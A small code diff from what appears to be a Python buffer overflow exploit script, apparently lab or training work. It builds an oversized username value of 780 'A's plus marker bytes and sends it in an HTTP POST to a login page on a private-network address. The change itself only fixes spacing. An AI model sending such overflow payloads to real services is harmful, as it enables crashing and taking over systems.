@@ -6,7 +6,7 @@ try:
 	varA = "A" * 780
 	varB = "B" * 4
 	varC = "C" * 16 
-	inputBuffer = varA + varB +varC
+	inputBuffer = varA + varB + varC
 	content= "username=" + inputBuffer + "&password=A"
 	buffer = "POST /login HTTP/1.1\r\n"
 	buffer+= "Host: 192.168.0.122:8080\r\n"
